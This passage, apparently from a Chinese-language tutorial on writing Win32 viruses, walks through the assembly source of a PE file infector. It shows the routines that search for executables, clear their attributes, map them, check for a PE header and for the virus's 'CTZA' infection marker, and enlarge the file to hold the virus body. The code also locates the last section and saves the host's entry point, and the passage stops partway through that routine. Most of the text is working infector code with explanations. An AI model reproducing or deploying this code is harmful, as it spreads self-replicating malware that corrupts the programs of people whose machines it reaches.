
## `__1:`

```asm
push dword ptr [ebp+OldEIP]          ; 保存 OldEIP 和 ModBase,
push dword ptr [ebp+ModBase]         ; 感染时改变
call Infection                       ; 感染找到的文件
pop dword ptr [ebp+ModBase]         ; 恢复它们
pop dword ptr [ebp+OldEIP]
inc byte ptr [ebp+infections]       ; 增加计数器
cmp byte ptr [ebp+infections],05h   ; 超过限制啦?
jz FailInfect                      ; 该死...
```

我们所做的第一件事是保存了一些必须的变量的内容，它们在后面我们返回控制权给主体的
时候用到，但是这些变量在感染文件的时候改变了是很痛苦的。我们调用感染例程：它仅
需要`WFD`信息，所以我们不必给它传参数了。在感染完相关的文件后，我们把值再改回来。
在做完那个以后，我们增加感染计数器，并检查我们是否已经感染了5个文件了(这个病毒
的感染限制)。如果我们已经做完了那些事情，病毒从感染函数中退出。

## `__2:`

```asm
lea edi,[ebp+WFD_szFileName]        ; 指向文件名的指针
mov ecx,MAX_PATH                    ; ECX = 260
xor al,al                           ; AL = 00
rep stosb                           ; 清除旧的文件名变量
lea eax,[ebp+offset WIN32_FIND_DATA] ; 指向 WFD的指针
push eax                             ; 把它压栈
push dword ptr [ebp+SearchHandle]    ; Push Search Handle
call [ebp+\_FindNextFileA]            ; 寻找另外一个文件
or eax,eax                         ; 失败?
jnz __1                             ; 没有, 感染另外一个
CloseSearchHandle:
push dword ptr [ebp+SearchHandle]    ; Push search handle
call [ebp+\_FindClose]                ; 关闭它
FailInfect:
ret
```

代码块的开始部分做一个简单的事情：它抹掉在`WFD`结构(校验文件名数据)里的数据。
这样做是为了在寻找另外一个文件的时候避免出问题。我们下一步要做的是调用
`FindNextFile`这个`API`函数。下面是这个`API`的描述:

`FindNextFile` 函数继续以前调用的`FindFirstFile`函数来继续搜索一个文件 。

```c
BOOL FindNextFile(
  HANDLE hFindFile,   // 要搜索的句柄
  LPWIN32_FIND_DATA lpFindFileData    // 指向保存找到文件的数据的结构
 );
```

参数
====

`?hFindFile`: 识别由先前的调用`FindFirstFile`函数返回的搜索句柄。

`?lpFindFileData`: 指向一个`WIN32_FIND_DATA` 结构，用来接受关于找到的文件或子目录
的的信息。这个结构可以在随后的调用`FindNextFile`时引用来寻找文件或目录。

返回值
======

`?`如果函数调用成功，返回值是非零值。

`?`如果函数调用成功，返回值是0。为了获得详细的错误信息，调用`GetLastError`。

`?`如果没有匹配的文件，`GetLastError`函数会返回`ERROR_NO_MORE_FILES`。

如果`FindNextFile`返回错误，或者如果病毒已经到达了可能感染的最大文件数，我们到了
这个例程的最后一块。它由通过`FindClose`这个`API`来关闭搜索句柄组成。照常，下面是
这个`API`的描述:

`FindClose`函数关闭指定的搜索句柄。`FindFirstFile` 和 `FindNextFile` 函数使用这个
句柄来用匹配给定的名字来定位文件。

```c
BOOL FindClose(
  HANDLE hFindFile    // 文件搜索句柄
 );
```

参数
====

`?hFindFile`: 识别搜索句柄。这个句柄必须是由`FindFirstFile`函数已经打开的。

返回值
======

`?`如果函数调用成功，返回值是非0值。

`?`如果函数调用失败，返回值是0。为了获得详细的错误信息，调用`GetLastError`

## `Infection:`

```asm
lea esi,[ebp+WFD_szFileName]        ; 获得要感染的文件名
push 80h
push esi
call [ebp+\_SetFileAttributesA]       ; 清除它的属性
call OpenFile                        ; 打开它
inc eax                             ; 如果 EAX = -1, 就有一个错误
jz CantOpen
dec eax
mov dword ptr [ebp+FileHandle],eax
```

我们首先做的是清除文件的属性，并把它们设置为"正常文件"。这是通过`SetFileAttributes`
这个`API`来实现的。下面给出这个`API`的简要介绍：

`SetFileAttributes` 函数 设置一个文件的属性。

```c
BOOL SetFileAttributes(
  LPCTSTR lpFileName, // 文件名的地址
  DWORD dwFileAttributes      // 要设置的属性的地址
 );
```

参数
====

`?lpFileName`: 指向一个保存要修改属性的文件的文件名字符串。

`?dwFileAttributes`: 指定要设置的文件的属性。这个参数可以为下面的值的组合。然而，
所有的其它的值超越`FILE_ATTRIBUTE_NORMAL`

返回值
======

`?`如果函数调用成功，返回值是非0值。

`?`如果函数调用失败，返回值是0。为了获得详细的错误信息，调用`GetLastError`

在我们设置了新的文件属性之后，我们打开了文件，而且，如果没有任何错误发生，它把
句柄保存到它的变量中。

```asm
mov ecx,dword ptr [ebp+WFD_nFileSizeLow] ; 首先我们用它的正确大小创建映射
call CreateMap
or eax,eax
jz CloseFile
mov dword ptr [ebp+MapHandle],eax
mov ecx,dword ptr [ebp+WFD_nFileSizeLow]
call MapFile                         ; 映射它
or eax,eax
jz UnMapFile
mov dword ptr [ebp+MapAddress],eax
```

首先我们给`ECX`赋我们打算要映射的文件的大小，然后我们调用我们的函数来映射它。
我们检查可能的错误，如果没有任何错误，我们继续，否则，我们关闭文件。然后我们
保存映射句柄，并准备最终利用`MapFile`函数来映射它。还象以前那样，我们检查错误，
决定相应的处理。如果所有的都做好了，我们保存映射起作用的地址。

```asm
mov esi,[eax+3Ch]
add esi,eax
cmp dword ptr [esi],"EP"            ; 它是PE吗?
jnz NoInfect
cmp dword ptr [esi+4Ch],"CTZA"     ; 它被感染了吗?
jz NoInfect
push dword ptr [esi+3Ch]
push dword ptr [ebp+MapAddress]      ; 关闭所有
call [ebp+\_UnmapViewOfFile]
push dword ptr [ebp+MapHandle]
call [ebp+\_CloseHandle]
pop ecx
```

当我们在`EAX`中得到了开始映射的地址，我们刷新指向`PE`头(`MapAddress+3Ch`)的指针，
然后我们规范化它，所以在`ESI`中我们将得到指向`PE`头的指针。总之我们检查它是否`OK`，
所以我们检查`PE`签名。在那个检查之后，我们检查文件是否在以前感染过了(我们在`PE`的
偏移地址`4Ch`处保存了一个标记，程序从来不会用的)，如果它没有，我们继续感染过程。
我们保存他们，在堆栈中 ，文件对齐(看看`PE`头那一章)。而且在那之后，我们解除映射，
并关闭映射句柄。最终我们从堆栈恢复文件对齐(`File Alignment`)，把它存在`ECX`寄存器中。

```asm
mov eax,dword ptr [ebp+WFD_nFileSizeLow] ; 再次映射
add eax,virus_size
call Align
xchg ecx,eax
call CreateMap
or eax,eax
jz CloseFile
mov dword ptr [ebp+MapHandle],eax
mov ecx,dword ptr [ebp+NewSize]
call MapFile
or eax,eax
jz UnMapFile
mov dword ptr [ebp+MapAddress],eax
mov esi,[eax+3Ch]
add esi,eax
```

当我们在`ECX`(准备`'Align'`函数，因为它需要在`ECX`中的对齐因子)中得到了文件对齐，我们
给`EAX`赋打开的文件大小加上病毒大小(`EAX`是要对齐的数量)，然后我们调用`'Align'`函数，
它在`EAX`中返回给我们对齐的数字。例如，如果对齐(`Alignment`)是`200h`，而且文件大小+
病毒大小是`12345h`，`'Align'`函数将会返回给我们的数字将会是`12400h`。然后我们把对齐数字
保存到`ECX`中。我们再次调用`CreateMap`函数，但是现在我们用对齐后的大小来映射文件。
在这之后，我们再次使`ESI`指向`PE`头。

```asm
mov edi,esi                         ; EDI = ESI = Ptr to PE header
movzx eax,word ptr [edi+06h]          ; AX = n?of sections
dec eax                             ; AX--
imul eax,eax,28h                     ; EAX = AX*28
add esi,eax                         ; Normalize
add esi,78h                         ; Ptr to dir table
mov edx,[edi+74h]                   ; EDX = n?of dir entries
shl edx,3                           ; EDX = EDX*8
add esi,edx                         ; ESI = Ptr to last section
```

首先我们也使`EDI`指向`PE`头。然后，我们给`AX`赋节的个数(一个`WORD`类型的数)，并使它
减1。然后我们把`AX`(n,节数-1)乘以`28h`(节头的大小)，把它再加上`PE`头的偏移地址。使`ESI`
指向目录表，在`EDX`中得到目录入口点的数目。然后我们把它乘以8，最后把结果(在`EDX`中)
加到`ESI`，所以`ESI`将指到最后一节。

```asm
mov eax,[edi+28h]                   ; 获得 EP
mov dword ptr [ebp+OldEIP],eax      ; 保存它
mov eax,[edi+34h]                   ; 获得 imagebase
mov dword ptr [ebp+ModBase],eax     ; 保存它
mov edx,[esi+10h]                   ; EDX = SizeOfRawData
mov ebx,edx                         ; EBX = EDX
```
